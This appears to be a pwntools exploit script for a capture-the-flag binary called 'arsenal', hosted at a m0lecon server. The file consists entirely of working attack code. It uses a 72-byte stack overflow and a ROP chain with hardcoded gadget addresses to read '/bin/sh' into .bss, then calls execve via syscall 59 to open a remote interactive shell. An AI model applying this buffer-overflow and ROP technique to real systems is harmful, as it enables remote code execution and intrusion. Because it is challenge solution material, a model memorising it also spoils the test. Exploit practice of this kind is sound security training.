#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./arsenal', checksec=False)
context.arch = 'amd64'

#print(hex(elf.bss()))
bss_addr = 0x4abac0

OFFSET_TO_RIP = 72
ret = 0x000000000040101a
pop_rdi_ret = 0x000000000040196e
pop_rsi_ret = 0x0000000000401977
pop_rdx_ret = 0x0000000000401980
pop_rax_ret = 0x0000000000401989
#buffer_start = 0x7fffffffd9f0
#syscall = 0x0000000000401324
syscall_ret   = 0x0000000000401992

read_func     = 0x4196b0 
vuln = elf.symbols['vuln']
#main = elf.symbols['main']
#vuln_call = 0x4019f0

#p = gdb.debug(elf.path, gdbscript="""
#b vuln
#continue
#""")

#p = process(elf.path)
p = remote ("offsec.m0lecon.it", 13546)

payload1 = flat( 
        b'A' * OFFSET_TO_RIP,
        p64(ret),
        p64(pop_rdi_ret), p64(0),
        p64(pop_rsi_ret), p64(bss_addr),
        p64(pop_rdx_ret), p64(8),
        p64(read_func), #when this executes, the binary pauses and waits for 8 bytes p.send(b'/bin/sh\x00')
        p64(ret), 
        p64(vuln), 
        )

p.recvuntil(b'weapons:')
p.send(payload1)
import time; time.sleep(0.3)
p.send(b'/bin/sh\x00')

#puts bss address into rdi, then execute syscall
payload2 = flat(
        b'A' * OFFSET_TO_RIP,
        p64(ret), 
        p64(pop_rdi_ret), p64(bss_addr), 
        p64(pop_rsi_ret), p64(0), 
        p64(pop_rdx_ret), p64(0), 
        p64(pop_rax_ret), p64(59), 
        #p64(ret), 
        p64(syscall_ret)
)
p.recvuntil(b'weapons:')
p.send(payload2)

p.interactive()
